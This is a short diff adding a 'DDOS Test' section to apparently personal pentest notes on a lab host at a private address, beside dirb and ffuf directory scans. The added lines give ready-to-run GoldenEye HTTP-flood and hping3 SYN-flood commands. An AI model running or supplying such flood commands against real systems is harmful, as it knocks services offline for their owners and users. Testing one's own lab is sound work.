@@ -124,3 +124,11 @@ dirb http://192.168.0.132:8000
 
 ffuf -u http://192.168.0.132:8000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
+🔹 DDOS Test
+
+GoldenEye（HTTP Flood）
+python3 goldeneye.py http://192.168.0.132:8000/
+
+hping3（SYN Flood） 洪水型攻擊 但似乎有點沒用
+sudo hping3 -S --flood -V -p 8000 192.168.0.132
+
